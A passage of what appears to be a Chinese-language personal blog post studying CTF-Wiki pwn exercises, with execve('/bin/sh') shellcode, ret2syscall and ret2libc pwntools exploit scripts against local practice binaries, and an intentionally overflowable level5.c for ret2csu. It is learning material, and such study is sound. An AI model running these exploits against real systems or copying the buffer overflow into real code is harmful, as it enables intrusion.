edx             </span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></li>
<li><p><strong>32位精简shellcode的编写</strong></p>
<ul>
<li><p>采用栈传参：直接将参数入栈，而且是按照参数顺序从右向左依次入栈。</p>
<blockquote>
<p> 32位传参规则</p>
<p> 调用函数地址–&gt; 返回参数 –&gt; 参数1 –&gt;  参数2 –&gt;  …</p>
</blockquote>
<p>Payload传递形式：p32(call_vuln)+p32(ret_addr)+p32(参数1)+p32(参数2)+p32(参数3)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x68732f </span></span><br><span class="line"><span class="string">push 0x6e69622f </span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb </span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#########################################################################</span><br><span class="line">## 一般函数调用参数是压入栈中，这里系统调用使用寄存器</span><br><span class="line">## 需要对如下几个寄存器进行设置，可以比对官方的实现</span><br><span class="line"></span><br><span class="line">  ebx = /bin/sh     ## 第一个参数</span><br><span class="line">  ecx = 0             ## 第二个参数</span><br><span class="line">  edx = 0             ## 第三个参数</span><br><span class="line">  eax = 0xb           ## 0xb为系统调用号，即sys_execve()系统函数对应的序号</span><br><span class="line">  int 0x80            ## 执行系统中断</span><br><span class="line">######################################################################### </span><br><span class="line"></span><br><span class="line">## 更精炼的汇编代码</span><br><span class="line">## </span><br><span class="line">## 这里说明一下，很多博客都会用&quot;/bin//sh&quot;或者官方的&quot;/bin///sh&quot;</span><br><span class="line">## 作为第一个参数，即添加/线来填充空白字符。这里我将&quot;/bin/sh&quot;</span><br><span class="line">## 放在最前面，就不存在汇编代码中间存在空字符截断的问题；另外</span><br><span class="line">## &quot;/bin/sh&quot;是7个字符，32位中需要两行指令，末尾未填充的空字符</span><br><span class="line">## 刚好作为字符串结尾标志符，也就不需要额外压一个空字符入栈。</span><br><span class="line"></span><br><span class="line">	push 0x68732f        # 0x68732f --&gt; hs/     little endian</span><br><span class="line">	push 0x6e69622f      # 0x6e69622f --&gt; nib/  little endian</span><br><span class="line">	mov ebx, esp</span><br><span class="line">	xor edx, edx</span><br><span class="line">	xor ecx, ecx</span><br><span class="line">	mov al, 0xb          # al为eax的低8位</span><br><span class="line">	int 0x80</span><br><span class="line">	## 汇编之后字节长度为20字节</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕了很大的圈子，没曾想可以直接这样生成，积累经验！</span></span><br><span class="line"><span class="comment"># 用shellcode相关的pwntools千万不要忘记设置架构！</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x68732f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx, esp</span></span><br><span class="line"><span class="string">xor edx, edx</span></span><br><span class="line"><span class="string">xor ecx, ecx</span></span><br><span class="line"><span class="string">mov al, 0xb          </span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="Ctf-Wiki例题"><a href="#Ctf-Wiki例题" class="headerlink" title="Ctf-Wiki例题"></a>Ctf-Wiki例题</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.4xsdgadp0268.webp"></p>
<p>​    几乎啥都没开，拖进IDA看看：</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.5sibki1oncw0.webp"></p>
<p>​    可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.100vw3i4rsts.webp"></p>
<p>​    由上面的知识我们可知：bss段可读可写不一定可以执行。我们动调利用<code>vmmap</code>看看其权限</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.30v9zwfslgxs.webp"></p>
<p>​    <code>R W - P</code>  说明其不可以执行，这与wiki原题上的做法不同。这时候我们就要想到<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_15762939/article/details/104062307">mprotect函数<i class="fas fa-external-link-alt"></i></a>：其可以修改一个进程的属性(RWX)，在我的另一篇博文中略有提到：<a href="http://c2yb8er.cn/2023/01/10/Pwnd0/">点击此处查看</a></p>
<p>​    这里留下一个大坑：<code>利用mprotect函数修改bss段的权限</code></p>
<p>​    在哪利用？如何利用？怎么实现？等我再往下学学再来试试。</p>
<h3 id="4-ret2syscall"><a href="#4-ret2syscall" class="headerlink" title="4.ret2syscall"></a>4.ret2syscall</h3><p>​    ret2syscall，即控制程序执行系统调用，获取 shell。</p>
<p>​    x86 通过 int 0x80 指令进行系统调用、x64 通过 syscall 指令进行系统调用</p>
<h4 id="ROPgadget和ropper的食用指南（没有开启PIE保护）"><a href="#ROPgadget和ropper的食用指南（没有开启PIE保护）" class="headerlink" title="ROPgadget和ropper的食用指南（没有开启PIE保护）"></a>ROPgadget和ropper的食用指南（没有开启PIE保护）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only &quot;pop|ret&quot;</span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --only &quot;pop|ret&quot; | grep &#x27;xxx&#x27;</span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --sting &#x27;/bin/sh&#x27;</span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">ropper</span><br><span class="line"></span><br><span class="line">file 文件名</span><br><span class="line"></span><br><span class="line">seach xxx</span><br></pre></td></tr></table></figure>

<h4 id="32位ret2syscall"><a href="#32位ret2syscall" class="headerlink" title="32位ret2syscall"></a>32位ret2syscall</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2syscall&quot;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080be408</span></span><br><span class="line">int0x80 = <span class="number">0x08049421</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int0x80])</span><br><span class="line">c.sendline(payload)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在Linux的32位下，控制：<br>eax = 0xb // 11<br>ebx = bin_sh_addr  <mark>前提是源文件当中本来就有了”/bin/sh”的地址</mark><br>ecx = 0<br>edx = 0<br>再执行int 0x80指令<br>即可执行：execve(“/bin/sh”, NULL, NULL)，获得到shell</p>
</blockquote>
<p>​    32位传参规则在32位下精密编写shellcode已经介绍，不再赘述。</p>
<h4 id="64位ret2syscall"><a href="#64位ret2syscall" class="headerlink" title="64位ret2syscall"></a>64位ret2syscall</h4><p>​    64位传参规则在64位下精密编写shellcode已经介绍，不再赘述。</p>
<blockquote>
<p>在Linux的64位下，控制：<br>rax = 0x3b // 59<br>rdi = bin_sh_addr<br>rsi = 0<br>rdx = 0<br>再执行syscall指令即可执行：execve(“/bin/sh”, NULL, NULL)，获得到shell</p>
</blockquote>
<p>​    基本流程：</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230114/%E5%9B%BE%E7%89%871.4cv0x5omsi68.webp"></p>
<h3 id="5-ret2libc1"><a href="#5-ret2libc1" class="headerlink" title="5.ret2libc1"></a>5.ret2libc1</h3><p>​    <strong>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。</strong>一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
<blockquote>
<ol>
<li><p>libc:Linux下的ANSI C的函数库</p>
</li>
<li><p>PLT: 程序链接表（PLT，Procedure Link Table）</p>
</li>
<li><p>GOT: 全局偏移表（GOT, Global Offset Table）</p>
</li>
<li><p>需要存放外部函数的数据段 —— PLT</p>
<p>获取数据段存放函数地址的一小段额外代码 —— GOT</p>
</li>
<li><p>PLT属于代码段，在进程加载和运行过程都不会发生改变，PLT指向GOT表的关系在编译时已完全确定，唯一能发生变化的是GOT表。</p>
</li>
</ol>
<p>贴几个学习plt表和got表的链接，我目前感觉有点云里雾里：</p>
<ol>
<li><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/welkinchan/p/11186339.html">PLT与GOT<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/farmwang/article/details/73556017">plt和got<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link" target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1663915740492408592&wfr=spider&for=pc">深入理解PLT表和GOT表<i class="fas fa-external-link-alt"></i></a></li>
</ol>
</blockquote>
<p>​    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret2libc1 -有/bin/sh，有system-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc1&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">bin_sh = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>,system_plt,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>

<p>​    这里我对system函数的压入参数存在疑惑：</p>
<blockquote>
<p>我自己理解的是如果调用system函数的话栈里面先把system的参数入栈然后压入system函数的返回地址，然后再压ebp，再压局部变量。但是payload这样做不就说明是先压的返回地址再压的参数。<mark>先放在这里后面再来解决</mark></p>
</blockquote>
<h3 id="6-ret2libc2"><a href="#6-ret2libc2" class="headerlink" title="6.ret2libc2"></a>6.ret2libc2</h3><p>​    没有<code>/bin/sh</code>就自己利用现有输入函数例如<code>gets函数</code>写在可写区域。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary ret2libc2 --only &#x27;pop|ret&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># ret2libc2 -无/bin/sh，有system-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc2&quot;</span>)</span><br><span class="line">system_plt=<span class="number">0x08048490</span></span><br><span class="line">gets_plt = <span class="number">0x08048460</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x0804843d</span></span><br><span class="line">buf2 = <span class="number">0x0804A080</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,gets_plt,pop_ebx_ret,buf2,system_plt,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,buf2])</span><br><span class="line"><span class="comment">#payload = flat([&#x27;a&#x27;*0x70,gets_plt,system_plt,buf2,buf2])</span></span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>

<p>​    对两种都能打通的payload进行说明</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一种</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,gets_plt,pop_ebx_ret,buf2,system_plt,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,buf2])</span><br><span class="line"><span class="comment"># 第二种</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,gets_plt,system_plt,buf2,buf2])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="第一种payload的解释："><a href="#第一种payload的解释：" class="headerlink" title="第一种payload的解释："></a>第一种payload的解释：</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.46pvik70tcow.webp"></p>
<p>​    当gets函数执行完毕后，<code>esp</code>会指向到gets函数的返回地址，此时<code>esp</code>距离<code>system_plt</code>还差八个字节，因为<code>pop_ebx_ret</code>将使esp自增两次（每次增4）故最后能够指向<code>system_plt</code>从而顺利地调用system函数。</p>
<h4 id="第二种payload的解释："><a href="#第二种payload的解释：" class="headerlink" title="第二种payload的解释："></a>第二种payload的解释：</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.5t87trit7ke8.webp"></p>
<p>​    当gets函数执行完毕后，直接跳转到调用system函数的地址，从而顺利调用system函数。</p>
<p>​    参考文章：<a class="link" target="_blank" rel="noopener" href="https://mzgao.blog.csdn.net/article/details/104321534">点击此处跳转<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="7-ret2libc3"><a href="#7-ret2libc3" class="headerlink" title="7.ret2libc3"></a>7.ret2libc3</h3><p>​    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret2libc2  - 无/bin/sh，无system -</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = celf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = celf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = celf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(&quot;leak libc_start_main_got addr and return to main again!&quot;)</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,puts_plt,main,libc_start_main_got])</span><br><span class="line">c.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(c.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__libc_start_main&quot;</span>,libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;get flag&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>,system_addr,<span class="string">&#x27;aaaa&#x27;</span>,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>

<p>​    经过测试，<code>LibcSearcher</code>搜到的三个偏移都不行，如下情况：（我们选择自己尝试，不当脚本小子！）</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.kchnb6ohf1c.webp"></p>
<p>​        <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_21746331/article/details/113546124?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167387403516800192239160%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167387403516800192239160&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-113546124-null-null.142%5Ev71%5Ewechat,201%5Ev4%5Eadd_ask&utm_term=libc%20database%20search&spm=1018.2226.3001.4187">0x5 libc database search介绍<i class="fas fa-external-link-alt"></i></a></p>
<p>​        <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/iamwenyifuxing/article/details/114301229?ops_request_misc=&request_id=&biz_id=102&utm_term=objdump%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-114301229.142%5Ev71%5Ewechat,201%5Ev4%5Eadd_ask&spm=1018.2226.3001.4187">objdump使用方法<i class="fas fa-external-link-alt"></i></a></p>
<p>利用objdump手动得到<code>puts_plt</code>和<code>libc_start_main_got</code></p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.75amggzdaxds.webp"></p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.427b7iwwi4lc.webp"></p>
<p>​    更简便的方法就是使用<code>ELF</code>:</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.24qwzpeh3pj4.webp"></p>
<p>​    但是很奇怪，手动还是打不通：<strong>不知道错在哪里</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/虚拟机共享文件夹/ctf-wiki/wiki原题目/ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = celf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = celf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = celf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span>,puts_plt,main,libc_start_main_got])</span><br><span class="line">c.sendlineafter(<span class="string">&#x27;Can you find it !?&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u32(c.recv(<span class="number">4</span>))</span><br><span class="line">libcbase = libc_start_main_addr - 	<span class="number">0x015de0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line"><span class="built_in">print</span>(libcbase)</span><br><span class="line">system_addr = libcbase +  	<span class="number">0x035fd0</span></span><br><span class="line">bin_sh = libcbase + 	<span class="number">0x10d32a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">104</span>,system_addr,bin_sh])</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230116/%E5%9B%BE%E7%89%87.2y5i3tko1q4g.webp"></p>
<h2 id="四、中级ROP"><a href="#四、中级ROP" class="headerlink" title="四、中级ROP"></a>四、中级ROP</h2><blockquote>
<p>中级 ROP 主要是使用了一些比较巧妙的 Gadgets。</p>
</blockquote>
<h3 id="1-ret2csu"><a href="#1-ret2csu" class="headerlink" title="1.ret2csu"></a>1.ret2csu</h3><p>​    在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。</p>
<blockquote>
<p>64位传参寄存器依次为：rdi,rsi,rdx,rcx,r8,r9。多余的参数和32位一样，被压入栈中。</p>
</blockquote>
<p>​    这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc  进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.33ziyl2oa1ts.webp"></p>
<p>参考：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33733970/article/details/78572733?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167556471416782425198404%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167556471416782425198404&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-78572733-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=%E6%B1%87%E7%BC%96%20jnz&spm=1018.2226.3001.4187">常用汇编指令<i class="fas fa-external-link-alt"></i></a></p>
<p>这里我们可以利用以下几点</p>
<ul>
<li>从 0x040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 rbx,rbp,r12,r13,r14,r15 寄存器的数据。</li>
<li>从 0x0400600 到 0x0400609，我们可以将 r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0</strong>），所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制  r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li>
<li>从 0x040060D 到 0x0400614，我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 = rbp，这样我们就不会执行 loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx=0，rbp=1。</li>
</ul>
<p>这里我们以蒸米的一步一步学 ROP 之 linux_x64 篇中 level5 为例进行学习。</p>
<p><a class="link" target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87.html">原文链接<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># level5.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

